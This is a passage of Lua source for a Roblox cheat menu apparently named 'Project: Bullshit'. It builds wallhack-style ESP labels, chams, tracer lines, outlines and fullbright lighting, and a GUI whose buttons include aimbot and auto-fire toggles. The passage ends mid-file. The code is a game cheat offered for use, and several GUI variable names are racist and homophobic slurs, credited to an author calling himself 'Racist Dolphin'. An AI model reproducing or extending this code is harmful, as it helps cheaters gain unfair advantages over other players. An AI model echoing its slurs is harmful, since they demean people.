					--Find.Frame.Pos.Text = "(X: " .. string.format("%.0f", pos.X) .. ", Y: " .. string.format("%.0f", pos.Y) .. ", Z: " .. string.format("%.0f", pos.Z) .. ")"
					if Find4 then
						Find.Frame.Health.Text = "Health: " .. string.format("%.0f", Find4.Health)
					else
						Find.Frame.Health.Text = ""
					end
				end
			end
		end
	end
end

function RemoveESP(Obj)
	if Obj ~= nil then
		local IsPlr = Obj:IsA("Player")
		local UseFolder = ItemESP
		if IsPlr then UseFolder = PlayerESP end

		local FindESP = ((IsPlr) and UseFolder:FindFirstChild("ESP Crap_" .. Obj.Name)) or FindESP(Obj)
		if FindESP then
			FindESP:Destroy()
		end
	end
end

function CreateESP(Obj)
	if Obj ~= nil then
		local IsPlr = Obj:IsA("Player")
		local UseFolder = ItemESP
		local GetChar = ((IsPlr) and Obj.Character) or Obj
		local Head = GetChar:FindFirstChild("Head")
		local t = tick()
		if IsPlr then UseFolder = PlayerESP end
		if Head == nil then
			repeat
				Head = GetChar:FindFirstChild("Head")
				wait()
			until Head ~= nil or (tick() - t) >= 10
		end
		if Head == nil then return end
		
		local bb = Instance.new("BillboardGui")
		bb.Adornee = Head
		bb.ExtentsOffset = Vector3.new(0, 1, 0)
		bb.AlwaysOnTop = true
		bb.Size = UDim2.new(0, 5, 0, 5)
		bb.StudsOffset = Vector3.new(0, 3, 0)
		bb.Name = "ESP Crap_" .. Obj.Name
		bb.Parent = UseFolder
		
		local frame = Instance.new("Frame", bb)
		frame.ZIndex = 10
		frame.BackgroundTransparency = 1
		frame.Size = UDim2.new(1, 0, 1, 0)
		
		local TxtName = Instance.new("TextLabel", frame)
		TxtName.Name = "Names"
		TxtName.ZIndex = 10
		TxtName.Text = Obj.Name
		TxtName.BackgroundTransparency = 1
		TxtName.Position = UDim2.new(0, 0, 0, -45)
		TxtName.Size = UDim2.new(1, 0, 10, 0)
		TxtName.Font = "SourceSansBold"
		TxtName.TextSize = 13
		TxtName.TextStrokeTransparency = 0.5

		local TxtDist = nil
		local TxtHealth = nil
		if IsPlr then
			TxtDist = Instance.new("TextLabel", frame)
			TxtDist.Name = "Dist"
			TxtDist.ZIndex = 10
			TxtDist.Text = ""
			TxtDist.BackgroundTransparency = 1
			TxtDist.Position = UDim2.new(0, 0, 0, -35)
			TxtDist.Size = UDim2.new(1, 0, 10, 0)
			TxtDist.Font = "SourceSansBold"
			TxtDist.TextSize = 13
			TxtDist.TextStrokeTransparency = 0.5

			TxtHealth = Instance.new("TextLabel", frame)
			TxtHealth.Name = "Health"
			TxtHealth.ZIndex = 10
			TxtHealth.Text = ""
			TxtHealth.BackgroundTransparency = 1
			TxtHealth.Position = UDim2.new(0, 0, 0, -25)
			TxtHealth.Size = UDim2.new(1, 0, 10, 0)
			TxtHealth.Font = "SourceSansBold"
			TxtHealth.TextSize = 13
			TxtHealth.TextStrokeTransparency = 0.5
		else
			local ObjVal = Instance.new("ObjectValue", bb)
			ObjVal.Value = Obj
		end
		
		local PickColor = GetTeamColor(Obj) or Bullshit.Colors.Neutral
		TxtName.TextColor3 = PickColor

		if IsPlr then
			TxtDist.TextColor3 = PickColor
			TxtHealth.TextColor3 = PickColor
		end
	end
end

function UpdateTracer(Plr)
	if Bullshit.TracersEnabled then
		if MyChar then
			local MyTor = MyChar:FindFirstChild("HumanoidRootPart")
			local GetTor = TracerData[Plr.Name]
			if MyTor and GetTor ~= nil and GetTor.Parent ~= nil then
				local Dist = (MyTor.Position - GetTor.Position).magnitude
				if (Dist < Bullshit.TracersLength and not Bullshit.Blacklist[Plr.Name]) and not (MyChar:FindFirstChild("InVehicle") or GetTor.Parent:FindFirstChild("InVehicle")) then
					if not Bullshit.PlaceTracersUnderCharacter then
						local R = MyCam:ScreenPointToRay(MyCam.ViewportSize.X / 2, MyCam.ViewportSize.Y, 0)
						Dist = (R.Origin - (GetTor.Position - Vector3.new(0, 3, 0))).magnitude
						Tracers[Plr.Name].Transparency = 1
						Tracers[Plr.Name].Size = Vector3.new(0.05, 0.05, Dist)
						Tracers[Plr.Name].CFrame = CFrame.new(R.Origin, (GetTor.Position - Vector3.new(0, 4.5, 0))) * CFrame.new(0, 0, -Dist / 2)
						Tracers[Plr.Name].BrickColor = BrickColor.new(GetTeamColor(Plr))
						Tracers[Plr.Name].BoxHandleAdornment.Transparency = 0
						Tracers[Plr.Name].BoxHandleAdornment.Size = Vector3.new(0.001, 0.001, Dist)
						Tracers[Plr.Name].BoxHandleAdornment.Color3 = GetTeamColor(Plr)
					else
						Dist = (MyTor.Position - (GetTor.Position - Vector3.new(0, 3, 0))).magnitude
						Tracers[Plr.Name].Transparency = 1
						Tracers[Plr.Name].Size = Vector3.new(0.3, 0.3, Dist)
						Tracers[Plr.Name].CFrame = CFrame.new(MyTor.Position - Vector3.new(0, 3, 0), (GetTor.Position - Vector3.new(0, 4.5, 0))) * CFrame.new(0, 0, -Dist / 2)
						Tracers[Plr.Name].BrickColor = BrickColor.new(GetTeamColor(Plr))
						Tracers[Plr.Name].BoxHandleAdornment.Transparency = 0
						Tracers[Plr.Name].BoxHandleAdornment.Size = Vector3.new(0.05, 0.05, Dist)
						Tracers[Plr.Name].BoxHandleAdornment.Color3 = GetTeamColor(Plr)
					end
				else
					Tracers[Plr.Name].Transparency = 1
					Tracers[Plr.Name].BoxHandleAdornment.Transparency = 1
				end
			end
		end
	end
end

function RemoveTracers(Plr)
	local Find = Tracers:FindFirstChild(Plr.Name)
	if Find then
		Find:Destroy()
	end
end

function CreateTracers(Plr)
	local Find = Tracers:FindFirstChild(Plr.Name)
	if not Find then
		local P = Instance.new("Part")
		P.Name = Plr.Name
		P.Material = "Neon"
		P.Transparency = 1
		P.Anchored = true
		P.Locked = true
		P.CanCollide = false
		local B = Instance.new("BoxHandleAdornment", P)
		B.Adornee = P
		B.Size = GetSizeOfObject(P)
		B.AlwaysOnTop = true
		B.ZIndex = 5
		B.Transparency = 0
		B.Color3 = GetTeamColor(Plr) or Bullshit.Colors.Neutral
		P.Parent = Tracers

		coroutine.resume(coroutine.create(function()
			while Tracers:FindFirstChild(Plr.Name) do
				UpdateTracer(Plr)
				Run.RenderStepped:wait()
			end
		end))
	end
end

function UpdateChams(Obj)
	if Obj == nil then return end

	if Obj:IsA("Player") then
		local Find = PlayerChams:FindFirstChild(Obj.Name)
		local GetChar = Obj.Character

		local Trans = 0
		if GetChar and MyChar then
			local GetHead = GetChar:FindFirstChild("Head")
			local GetTor = GetChar:FindFirstChild("HumanoidRootPart")
			local MyHead = MyChar:FindFirstChild("Head")
			local MyTor = MyChar:FindFirstChild("HumanoidRootPart")
			if GetHead and GetTor and MyHead and MyTor then
				if (MyTor.Position - GetTor.Position).magnitude > Bullshit.CHAMSLength or Bullshit.Blacklist[Obj.Name] then
					Trans = 1
				else
					--local MyCharStuff = MyChar:GetDescendants()
					local Ray = Ray.new(MyCam.CFrame.p, (GetTor.Position - MyCam.CFrame.p).unit * 2048)
					local part = workspace:FindPartOnRayWithIgnoreList(Ray, {MyChar})
					if part ~= nil then
						if part:IsDescendantOf(GetChar) then
							Trans = 0.9
						else
							Trans = 0
						end
					end
				end
			end
		end

		if Find then
			for i, v in next, Find:GetChildren() do
				if v.className ~= "ObjectValue" then
					v.Color3 = GetTeamColor(Obj) or Bullshit.Colors.Neutral
					v.Transparency = Trans
				end
			end
		end
	end
end

function RemoveChams(Obj)
	if Obj ~= nil then
		local IsPlr = Obj:IsA("Player")
		local UseFolder = ItemChams
		if IsPlr then UseFolder = PlayerChams end

		local FindC = UseFolder:FindFirstChild(tostring(Obj)) or FindCham(Obj)
		if FindC then
			FindC:Destroy()
		end
	end
end

function CreateChams(Obj)
	if Obj ~= nil then
		local IsPlr = Obj:IsA("Player")
		local UseFolder = ItemChams
		local Crap = nil
		local GetTor = nil
		local t = tick()
		if IsPlr then
			Obj = Obj.Character
			UseFolder = PlayerChams
		end
		if Obj == nil then return end
		GetTor = Obj:FindFirstChild("HumanoidRootPart") or Obj:WaitForChild("HumanoidRootPart")
		if IsPlr then Crap = Obj:GetChildren() else Crap = Obj:GetDescendants() end

		local FindC = ((IsPlr) and UseFolder:FindFirstChild(Obj.Name)) or FindCham(Obj)
		if not FindC then
			FindC = Instance.new("Folder", UseFolder)
			FindC.Name = Obj.Name
			local ObjVal = Instance.new("ObjectValue", FindC)
			ObjVal.Value = Obj
		end

		for _, P in next, Crap do
			if P:IsA("PVInstance") and P.Name ~= "HumanoidRootPart" then
				local Box = Instance.new("BoxHandleAdornment")
				Box.Size = GetSizeOfObject(P)
				Box.Name = "Cham"
				Box.Adornee = P
				Box.AlwaysOnTop = true
				Box.ZIndex = 5
				Box.Transparency = 0
				Box.Color3 = ((IsPlr) and GetTeamColor(Plrs:GetPlayerFromCharacter(Obj))) or Bullshit.Colors.Neutral
				Box.Parent = FindC
			end
		end
	end
end

function CreateMobESPChams()
	local mobspawn = { }

	for i, v in next, workspace:GetDescendants() do
		local hum = v:FindFirstChildOfClass("Humanoid")
		if hum and not Plrs:GetPlayerFromCharacter(hum.Parent) and FindCham(v) == nil and FindESP(v) == nil then
			mobspawn[tostring(v.Parent)] = v.Parent
			if Bullshit.CHAMSEnabled and Bullshit.MobChams then
				CreateChams(v)
			end
			if Bullshit.ESPEnabled and Bullshit.MobESP then
				CreateESP(v)
			end
		end
	end

	if Bullshit.Mob_ESP_CHAMS_Ran_Once == false then
		for i, v in next, mobspawn do
			v.ChildAdded:connect(function(Obj)
				if Bullshit.MobChams then
					local t = tick()
					local GetHum = Obj:FindFirstChildOfClass("Humanoid")
					if GetHum == nil then
						repeat
							GetHum = Obj:FindFirstChildOfClass("Humanoid")
							wait()
						until GetHum ~= nil or (tick() - t) >= 10
					end
					if GetHum == nil then return end

					CreateChams(Obj)
				end

				if Bullshit.MobESP then
					local t = tick()
					local GetHum = Obj:FindFirstChildOfClass("Humanoid")
					if GetHum == nil then
						repeat
							GetHum = Obj:FindFirstChildOfClass("Humanoid")
							wait()
						until GetHum ~= nil or (tick() - t) >= 10
					end
					if GetHum == nil then return end

					CreateESP(Obj)
				end
			end)
		end

		Bullshit.Mob_ESP_CHAMS_Ran_Once = true
	end
end

function CreateChildAddedEventFor(Obj)
	Obj.ChildAdded:connect(function(Obj2)
		if Bullshit.OutlinesEnabled then
			if Obj2:IsA("BasePart") and not Plrs:GetPlayerFromCharacter(Obj2.Parent) and not Obj2.Parent:IsA("Hat") and not Obj2.Parent:IsA("Accessory") and Obj2.Parent.Name ~= "Tracers" then
				local Data = { }
				Data[2] = Obj2.Transparency
				Obj2.Transparency = 1
				local outline = Instance.new("SelectionBox")
				outline.Name = "Outline"
				outline.Color3 = Color3.new(0, 0, 0)
				outline.SurfaceColor3 = Color3.new(0, 1, 0)
				--outline.SurfaceTransparency = 0.9
				outline.LineThickness = 0.01
				outline.Transparency = 0.5
				outline.Transparency = 0.5
				outline.Adornee = Obj2
				outline.Parent = Obj2
				Data[1] = outline
				rawset(Bullshit.OutlinedParts, Obj2, Data)
			end

			for i, v in next, Obj2:GetDescendants() do
				if v:IsA("BasePart") and not Plrs:GetPlayerFromCharacter(v.Parent) and not v.Parent:IsA("Hat") and not v.Parent:IsA("Accessory") and v.Parent.Name ~= "Tracers" then
					local Data = { }
					Data[2] = v.Transparency
					v.Transparency = 1
					local outline = Instance.new("SelectionBox")
					outline.Name = "Outline"
					outline.Color3 = Color3.new(0, 0, 0)
					outline.SurfaceColor3 = Color3.new(0, 1, 0)
					--outline.SurfaceTransparency = 0.9
					outline.LineThickness = 0.01
					outline.Transparency = 0.5
					outline.Adornee = v
					outline.Parent = v
					Data[1] = outline
					rawset(Bullshit.OutlinedParts, v, Data)
				end
				CreateChildAddedEventFor(v)
			end
		end
		CreateChildAddedEventFor(Obj2)
	end)
end

function LightingHax()
	if Bullshit.OutlinesEnabled then
		Light.TimeOfDay = "00:00:00"
	end

	if Bullshit.FullbrightEnabled then
		Light.Ambient = Color3.new(1, 1, 1)
		Light.ColorShift_Bottom = Color3.new(1, 1, 1)
		Light.ColorShift_Top = Color3.new(1, 1, 1)
	end
end

Plrs.PlayerAdded:connect(function(Plr)
	if Bullshit.CharAddedEvent[Plr.Name] == nil then
		Bullshit.CharAddedEvent[Plr.Name] = Plr.CharacterAdded:connect(function(Char)
			if Bullshit.ESPEnabled then
				RemoveESP(Plr)
				CreateESP(Plr)
			end
			if Bullshit.CHAMSEnabled then
				RemoveChams(Plr)
				CreateChams(Plr)
			end
			if Bullshit.TracersEnabled then
				CreateTracers(Plr)
			end
			repeat wait() until Char:FindFirstChild("HumanoidRootPart")
			TracerMT[Plr.Name] = Char.HumanoidRootPart
		end)
	end
end)

Plrs.PlayerRemoving:connect(function(Plr)
	if Bullshit.CharAddedEvent[Plr.Name] ~= nil then
		Bullshit.CharAddedEvent[Plr.Name]:Disconnect()
		Bullshit.CharAddedEvent[Plr.Name] = nil
	end
	RemoveESP(Plr)
	RemoveChams(Plr)
	RemoveTracers(Plr)
	TracerMT[Plr.Name] = nil
end)

function InitMain()
	-- Objects
	
	local Bullshit20 = Instance.new("ScreenGui")
	local MainFrame = Instance.new("Frame")
	local Title = Instance.new("TextLabel")
	local design = Instance.new("Frame")
	local buttons = Instance.new("Frame")
	local ESPToggle = Instance.new("TextButton")
	local ChamsToggle = Instance.new("TextButton")
	local TracersToggle = Instance.new("TextButton")
	local OutlineToggle = Instance.new("TextButton")
	local DebugToggle = Instance.new("TextButton")
	local FullbrightToggle = Instance.new("TextButton")
	local BlacklistToggle = Instance.new("TextButton")
	local WhitelistToggle = Instance.new("TextButton")
	local Crosshair = Instance.new("TextButton")
	local AimbotToggle = Instance.new("TextButton")
	local Settings = Instance.new("TextButton")
	local Information = Instance.new("TextButton")
	local Information_2 = Instance.new("Frame")
	local Title_2 = Instance.new("TextLabel")
	local design_2 = Instance.new("Frame")
	local buttons_2 = Instance.new("ScrollingFrame")
	local TextLabel = Instance.new("TextLabel")
	local Settings_2 = Instance.new("Frame")
	local Title_3 = Instance.new("TextLabel")
	local design_3 = Instance.new("Frame")
	local buttons_3 = Instance.new("ScrollingFrame")
	local AllyColor = Instance.new("TextBox")
	local CHAMSLength = Instance.new("TextBox")
	local CrosshairColor = Instance.new("TextBox")
	local ESPLength = Instance.new("TextBox")
	local EnemyColor = Instance.new("TextBox")
	local FreeForAll = Instance.new("TextButton")
	local FriendColor = Instance.new("TextBox")
	local NeutralColor = Instance.new("TextBox")
	local TracersLength = Instance.new("TextBox")
	local TracersUnderChars = Instance.new("TextButton")
	local AutoFireToggle = Instance.new("TextButton")
	local AimbotKey = Instance.new("TextButton")
	local MobESPButton = Instance.new("TextButton")
	local MobChamsButton = Instance.new("TextButton")
	local TextLabel_2 = Instance.new("TextLabel")
	local TextLabel_3 = Instance.new("TextLabel")
	local TextLabel_4 = Instance.new("TextLabel")
	local TextLabel_5 = Instance.new("TextLabel")
	local TextLabel_6 = Instance.new("TextLabel")
	local TextLabel_7 = Instance.new("TextLabel")
	local TextLabel_8 = Instance.new("TextLabel")
	local TextLabel_9 = Instance.new("TextLabel")
	local TextLabel_10 = Instance.new("TextLabel")
	local TextLabel_11 = Instance.new("TextLabel")
	local TextLabel_12 = Instance.new("TextLabel")
	local TextLabel_13 = Instance.new("TextLabel")
	local TextLabel_14 = Instance.new("TextLabel")
	local TextLabel_15 = Instance.new("TextLabel")
	local SaveSettings = Instance.new("TextButton")
	local Blacklist = Instance.new("Frame")
	local nigga = Instance.new("TextLabel")
	local niggerfaggot = Instance.new("Frame")
	local players = Instance.new("ScrollingFrame")
	local buttonsex = Instance.new("Frame")
	local Playername = Instance.new("TextBox")
	local AddToBlacklist = Instance.new("TextButton")
	local RemoveToBlacklist = Instance.new("TextButton")
	local SaveBlacklist = Instance.new("TextButton")
	local Whitelist = Instance.new("Frame")
	local nigga2 = Instance.new("TextLabel")
	local niggerfaggot2 = Instance.new("Frame")
	local players2 = Instance.new("ScrollingFrame")
	local buttonsex2 = Instance.new("Frame")
	local Playername2 = Instance.new("TextBox")
	local AddToWhitelist = Instance.new("TextButton")
	local RemoveToWhitelist = Instance.new("TextButton")
	local SaveWhitelist = Instance.new("TextButton")
	
	-- Properties
	
	Bullshit20.Name = "Bullshit 3.0"
	Bullshit20.Parent = CoreGui
	Bullshit20.ResetOnSpawn = false
	
	MainFrame.Name = "MainFrame"
	MainFrame.Parent = Bullshit20
	MainFrame.Active = true
	MainFrame.BackgroundColor3 = Color3.new(0.176471, 0.176471, 0.176471)
	MainFrame.BorderSizePixel = 0
	MainFrame.Draggable = true
	MainFrame.Position = UDim2.new(0.200000003, -175, 0.5, -100)
	MainFrame.Size = UDim2.new(0, 350, 0, 315)
	
	Title.Name = "Title"
	Title.Parent = MainFrame
	Title.BackgroundColor3 = Color3.new(1, 1, 1)
	Title.BackgroundTransparency = 1
	Title.Size = UDim2.new(1, 0, 0, 50)
	Title.Font = Enum.Font.SourceSansBold
	Title.Text = "Project: Bullshit\nMade by: Racist Dolphin#5199\nVersion 3.5.5 (RE-WORK IN THE WORKS)"
	Title.TextColor3 = Color3.new(1, 1, 1)
	Title.TextSize = 18
	Title.TextTransparency = 0.5
	
	design.Name = "design"
	design.Parent = MainFrame
	design.BackgroundColor3 = Color3.new(1, 1, 1)
	design.BackgroundTransparency = 0.5
	design.BorderSizePixel = 0
	design.Position = UDim2.new(0.0500000007, 0, 0, 50)
	design.Size = UDim2.new(0.899999976, 0, 0, 2)
	
	buttons.Name = "buttons"
	buttons.Parent = MainFrame
	buttons.BackgroundColor3 = Color3.new(1, 1, 1)
	buttons.BackgroundTransparency = 1
	buttons.Position = UDim2.new(0, 20, 0, 70)
	buttons.Size = UDim2.new(1, -40, 1, -80)

	Blacklist.Name = "Blacklist"
	Blacklist.Parent = MainFrame
	Blacklist.Active = true
	Blacklist.BackgroundColor3 = Color3.new(0.176471, 0.176471, 0.176471)
	Blacklist.BorderSizePixel = 0
	Blacklist.Position = UDim2.new(1, 3, 0.5, -138)
	Blacklist.Size = UDim2.new(0, 350, 0, 375)
	Blacklist.Visible = false
	
	nigga.Name = "nigga"
	nigga.Parent = Blacklist
	nigga.BackgroundColor3 = Color3.new(1, 1, 1)
	nigga.BackgroundTransparency = 1
	nigga.Size = UDim2.new(1, 0, 0, 50)
	nigga.Font = Enum.Font.SourceSansBold
	nigga.Text = "Blacklist Menu"
	nigga.TextColor3 = Color3.new(1, 1, 1)
	nigga.TextSize = 18
	nigga.TextTransparency = 0.5
	
	niggerfaggot.Name = "niggerfaggot"
	niggerfaggot.Parent = Blacklist
	niggerfaggot.BackgroundColor3 = Color3.new(1, 1, 1)
	niggerfaggot.BackgroundTransparency = 0.5
	niggerfaggot.BorderSizePixel = 0
	niggerfaggot.Position = UDim2.new(0.0500000007, 0, 0, 50)
	niggerfaggot.Size = UDim2.new(0.899999976, 0, 0, 2)
	
	players.Name = "players"
	players.Parent = Blacklist
	players.BackgroundColor3 = Color3.new(1, 1, 1)
	players.BackgroundTransparency = 1
	players.BorderSizePixel = 0
	players.Position = UDim2.new(0, 20, 0, 60)
	players.Size = UDim2.new(1, -40, 1, -175)
	players.CanvasSize = UDim2.new(0, 0, 5, 0)
	players.ScrollBarThickness = 8
	
	buttonsex.Name = "buttonsex"
	buttonsex.Parent = Blacklist
	buttonsex.BackgroundColor3 = Color3.new(1, 1, 1)
	buttonsex.BackgroundTransparency = 1
	buttonsex.Position = UDim2.new(0, 20, 0, 250)
	buttonsex.Size = UDim2.new(1, -40, 0, 100)
	
	Playername.Name = "Playername"
	Playername.Parent = buttonsex
	Playername.BackgroundColor3 = Color3.new(0.972549, 0.972549, 0.972549)
	Playername.BackgroundTransparency = 0.5
	Playername.BorderSizePixel = 0
	Playername.Size = UDim2.new(1, 0, 0, 20)
	Playername.Font = Enum.Font.SourceSansBold
	Playername.Text = "Enter Player Name"
	Playername.TextSize = 14
	Playername.TextWrapped = true
	
	AddToBlacklist.Name = "AddToBlacklist"
	AddToBlacklist.Parent = buttonsex
	AddToBlacklist.BackgroundColor3 = Color3.new(0.972549, 0.972549, 0.972549)
	AddToBlacklist.BackgroundTransparency = 0.5
	AddToBlacklist.BorderSizePixel = 0
	AddToBlacklist.Position = UDim2.new(0, 0, 0, 30)
	AddToBlacklist.Size = UDim2.new(1, 0, 0, 20)
	AddToBlacklist.Font = Enum.Font.SourceSansBold
	AddToBlacklist.Text = "Add to Blacklist"
	AddToBlacklist.TextSize = 14
	AddToBlacklist.TextWrapped = true
	
	RemoveToBlacklist.Name = "RemoveToBlacklist"
	RemoveToBlacklist.Parent = buttonsex
	RemoveToBlacklist.BackgroundColor3 = Color3.new(0.972549, 0.972549, 0.972549)
	RemoveToBlacklist.BackgroundTransparency = 0.5
	RemoveToBlacklist.BorderSizePixel = 0
	RemoveToBlacklist.Position = UDim2.new(0, 0, 0, 60)
	RemoveToBlacklist.Size = UDim2.new(1, 0, 0, 20)
	RemoveToBlacklist.Font = Enum.Font.SourceSansBold
	RemoveToBlacklist.Text = "Remove from Blacklist"
	RemoveToBlacklist.TextSize = 14
	RemoveToBlacklist.TextWrapped = true

	SaveBlacklist.Name = "SaveBlacklist"
	SaveBlacklist.Parent = buttonsex
	SaveBlacklist.BackgroundColor3 = Color3.new(0.972549, 0.972549, 0.972549)
	SaveBlacklist.BackgroundTransparency = 0.5
	SaveBlacklist.BorderSizePixel = 0
	SaveBlacklist.Position = UDim2.new(0, 0, 0, 90)
	SaveBlacklist.Size = UDim2.new(1, 0, 0, 20)
	SaveBlacklist.Font = Enum.Font.SourceSansBold
	SaveBlacklist.Text = "Save Blacklist"
	SaveBlacklist.TextSize = 14
	SaveBlacklist.TextWrapped = true

	Whitelist.Name = "Whitelist"
	Whitelist.Parent = MainFrame
	Whitelist.Active = true
	Whitelist.BackgroundColor3 = Color3.new(0.176471, 0.176471, 0.176471)
	Whitelist.BorderSizePixel = 0
	Whitelist.Position = UDim2.new(1, 3, 0.5, -138)
	Whitelist.Size = UDim2.new(0, 350, 0, 375)
	Whitelist.Visible = false
	
	nigga2.Name = "nigga2"
	nigga2.Parent = Whitelist
	nigga2.BackgroundColor3 = Color3.new(1, 1, 1)
	nigga2.BackgroundTransparency = 1
	nigga2.Size = UDim2.new(1, 0, 0, 50)
	nigga2.Font = Enum.Font.SourceSansBold
	nigga2.Text = "Friends List Menu"
	nigga2.TextColor3 = Color3.new(1, 1, 1)
	nigga2.TextSize = 18
	nigga2.TextTransparency = 0.5
	
	niggerfaggot2.Name = "niggerfaggot2"
	niggerfaggot2.Parent = Whitelist
	niggerfaggot2.BackgroundColor3 = Color3.new(1, 1, 1)
	niggerfaggot2.BackgroundTransparency = 0.5
	niggerfaggot2.BorderSizePixel = 0
	niggerfaggot2.Position = UDim2.new(0.0500000007, 0, 0, 50)
	niggerfaggot2.Size = UDim2.new(0.899999976, 0, 0, 2)
	
	players2.Name = "players2"
	players2.Parent = Whitelist
	players2.BackgroundColor3 = Color3.new(1, 1, 1)
	players2.BackgroundTransparency = 1
	players2.BorderSizePixel = 0
	players2.Position = UDim2.new(0, 20, 0, 60)
	players2.Size = UDim2.new(1, -40, 1, -175)
	players2.CanvasSize = UDim2.new(0, 0, 5, 0)
	players2.ScrollBarThickness = 8
	
	buttonsex2.Name = "buttonsex2"
	buttonsex2.Parent = Whitelist
	buttonsex2.BackgroundColor3 = Color3.new(1, 1, 1)
	buttonsex2.BackgroundTransparency = 1
	buttonsex2.Position = UDim2.new(0, 20, 0, 250)
	buttonsex2.Size = UDim2.new(1, -40, 0, 100)
	
	Playername2.Name = "Playername2"
	Playername2.Parent = buttonsex2
	Playername2.BackgroundColor3 = Color3.new(0.972549, 0.972549, 0.972549)
	Playername2.BackgroundTransparency = 0.5
	Playername2.BorderSizePixel = 0
	Playername2.Size = UDim2.new(1, 0, 0, 20)
	Playername2.Font = Enum.Font.SourceSansBold
	Playername2.Text = "Enter Player Name"
	Playername2.TextSize = 14
	Playername2.TextWrapped = true
	
	AddToWhitelist.Name = "AddToWhitelist"
	AddToWhitelist.Parent = buttonsex2
	AddToWhitelist.BackgroundColor3 = Color3.new(0.972549, 0.972549, 0.972549)
	AddToWhitelist.BackgroundTransparency = 0.5
	AddToWhitelist.BorderSizePixel = 0
	AddToWhitelist.Position = UDim2.new(0, 0, 0, 30)
	AddToWhitelist.Size = UDim2.new(1, 0, 0, 20)
	AddToWhitelist.Font = Enum.Font.SourceSansBold
	AddToWhitelist.Text = "Add to Friends List"
	AddToWhitelist.TextSize = 14
	AddToWhitelist.TextWrapped = true
	
	RemoveToWhitelist.Name = "RemoveToWhitelist"
	RemoveToWhitelist.Parent = buttonsex2
	RemoveToWhitelist.BackgroundColor3 = Color3.new(0.972549, 0.972549, 0.972549)
	RemoveToWhitelist.BackgroundTransparency = 0.5
	RemoveToWhitelist.BorderSizePixel = 0
	RemoveToWhitelist.Position = UDim2.new(0, 0, 0, 60)
	RemoveToWhitelist.Size = UDim2.new(1, 0, 0, 20)
	RemoveToWhitelist.Font = Enum.Font.SourceSansBold
	RemoveToWhitelist.Text = "Remove from Friends List"
	RemoveToWhitelist.TextSize = 14
	RemoveToWhitelist.TextWrapped = true

	SaveWhitelist.Name = "SaveWhitelist"
	SaveWhitelist.Parent = buttonsex2
	SaveWhitelist.BackgroundColor3 = Color3.new(0.972549, 0.972549, 0.972549)
	SaveWhitelist.BackgroundTransparency = 0.5
	SaveWhitelist.BorderSizePixel = 0
	SaveWhitelist.Position = UDim2.new(0, 0, 0, 90)
	SaveWhitelist.Size = UDim2.new(1, 0, 0, 20)
	SaveWhitelist.Font = Enum.Font.SourceSansBold
	SaveWhitelist.Text = "Save Friends List"
	SaveWhitelist.TextSize = 14
	SaveWhitelist.TextWrapped = true

	BlacklistToggle.Name = "BlacklistToggle"
	BlacklistToggle.Parent = buttons
	BlacklistToggle.BackgroundColor3 = Color3.new(1, 1, 1)
	BlacklistToggle.BackgroundTransparency = 0.5
	BlacklistToggle.BorderSizePixel = 0
	BlacklistToggle.Position = UDim2.new(0, 0, 0, 200)
	BlacklistToggle.Size = UDim2.new(0, 150, 0, 30)
	BlacklistToggle.Font = Enum.Font.SourceSansBold
	BlacklistToggle.Text = "Blacklist"
	BlacklistToggle.TextColor3 = Color3.new(0.176471, 0.176471, 0.176471)
	BlacklistToggle.TextSize = 14
	BlacklistToggle.TextWrapped = true

	WhitelistToggle.Name = "WhitelistToggle"
	WhitelistToggle.Parent = buttons
	WhitelistToggle.BackgroundColor3 = Color3.new(1, 1, 1)
	WhitelistToggle.BackgroundTransparency = 0.5
	WhitelistToggle.BorderSizePixel = 0
	WhitelistToggle.Position = UDim2.new(1, -150, 0, 200)
	WhitelistToggle.Size = UDim2.new(0, 150, 0, 30)
	WhitelistToggle.Font = Enum.Font.SourceSansBold
	WhitelistToggle.Text = "Friends List"
	WhitelistToggle.TextColor3 = Color3.new(0.176471, 0.176471, 0.176471)
	WhitelistToggle.TextSize = 14
	WhitelistToggle.TextWrapped = true
	
	ESPToggle.Name = "ESPToggle"
	ESPToggle.Parent = buttons
	ESPToggle.BackgroundColor3 = Color3.new(1, 1, 1)
	ESPToggle.BackgroundTransparency = 0.5
	ESPToggle.BorderSizePixel = 0
	ESPToggle.Size = UDim2.new(0, 150, 0, 30)
	ESPToggle.Font = Enum.Font.SourceSansBold
	ESPToggle.Text = "ESP"
	ESPToggle.TextColor3 = Color3.new(0.176471, 0.176471, 0.176471)
	ESPToggle.TextSize = 14
	ESPToggle.TextWrapped = true
	
	ChamsToggle.Name = "ChamsToggle"
	ChamsToggle.Parent = buttons
	ChamsToggle.BackgroundColor3 = Color3.new(1, 1, 1)
	ChamsToggle.BackgroundTransparency = 0.5
	ChamsToggle.BorderSizePixel = 0
	ChamsToggle.Position = UDim2.new(1, -150, 0, 0)
	ChamsToggle.Size = UDim2.new(0, 150, 0, 30)
	ChamsToggle.Font = Enum.Font.SourceSansBold
	ChamsToggle.Text = "Chams"
	ChamsToggle.TextColor3 = Color3.new(0.176471, 0.176471, 0.176471)
	ChamsToggle.TextSize = 14
	ChamsToggle.TextWrapped = true
	
	TracersToggle.Name = "TracersToggle"
	TracersToggle.Parent = buttons
	TracersToggle.BackgroundColor3 = Color3.new(1, 1, 1)
	TracersToggle.BackgroundTransparency = 0.5
	TracersToggle.BorderSizePixel = 0
	TracersToggle.Position = UDim2.new(0, 0, 0, 40)
	TracersToggle.Size = UDim2.new(0, 150, 0, 30)
	TracersToggle.Font = Enum.Font.SourceSansBold
	TracersToggle.Text = "Tracers"
	TracersToggle.TextColor3 = Color3.new(0.176471, 0.176471, 0.176471)
	TracersToggle.TextSize = 14
	TracersToggle.TextWrapped = true
	
	OutlineToggle.Name = "OutlineToggle"
	OutlineToggle.Parent = buttons
	OutlineToggle.BackgroundColor3 = Color3.new(1, 1, 1)
	OutlineToggle.BackgroundTransparency = 0.5
	OutlineToggle.BorderSizePixel = 0
	OutlineToggle.Position = UDim2.new(1, -150, 0, 40)
	OutlineToggle.Size = UDim2.new(0, 150, 0, 30)
	OutlineToggle.Font = Enum.Font.SourceSansBold
	OutlineToggle.Text = "Outlines"
	OutlineToggle.TextColor3 = Color3.new(0.176471, 0.176471, 0.176471)
	OutlineToggle.TextSize = 14
	OutlineToggle.TextWrapped = true
	
	DebugToggle.Name = "DebugToggle"
	DebugToggle.Parent = buttons
	DebugToggle.BackgroundColor3 = Color3.new(1, 1, 1)
	DebugToggle.BackgroundTransparency = 0.5
	DebugToggle.BorderSizePixel = 0
	DebugToggle.Position = UDim2.new(1, -150, 0, 80)
	DebugToggle.Size = UDim2.new(0, 150, 0, 30)
	DebugToggle.Font = Enum.Font.SourceSansBold
	DebugToggle.Text = "Debug Info"
